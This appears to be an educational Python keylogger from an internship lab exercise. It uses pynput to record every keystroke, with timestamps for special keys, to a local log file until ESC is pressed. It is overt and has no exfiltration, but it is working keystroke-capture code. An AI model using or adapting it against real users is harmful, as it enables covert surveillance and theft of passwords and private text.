"""
Arc Technology Internship — Key Logging Simulation
FOR USE ONLY IN AN ISOLATED LAB / PERSONAL PC
"""
from pynput import keyboard
from datetime import datetime
import os

LOG_FILE = "keystrokes.log"

def write_log(text):
    with open(LOG_FILE, "a") as f:
        f.write(text)

def on_press(key):
    timestamp = datetime.now().strftime("%H:%M:%S")
    try:
        if hasattr(key, 'char') and key.char is not None:
            write_log(key.char)
        elif key == keyboard.Key.space:
            write_log(" ")
        elif key == keyboard.Key.enter:
            write_log(f"\n[{timestamp}] ENTER\n")
        elif key == keyboard.Key.tab:
            write_log(f"\n[{timestamp}] TAB\n")
        elif key == keyboard.Key.backspace:
            write_log("[BACKSPACE]")
        elif key == keyboard.Key.esc:
            write_log(f"\n[{timestamp}] ESC\n")
            print("[+] ESC pressed. Stopping logger.")
            return False
        else:
            write_log(f"[{key.name.upper()}]")
    except Exception as e:
        write_log(f"[ERROR: {e}]")

if __name__ == "__main__":
    if not os.path.exists(LOG_FILE):
        with open(LOG_FILE, "w") as f:
            f.write(f"=== Keylogger Session Started: {datetime.now()} ===\n\n")

    print("[+] Educational Keylogger Started")
    print("[+] Logging to:", LOG_FILE)
    print("[+] Press ESC to stop.\n")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

    print("\n[+] Session ended.")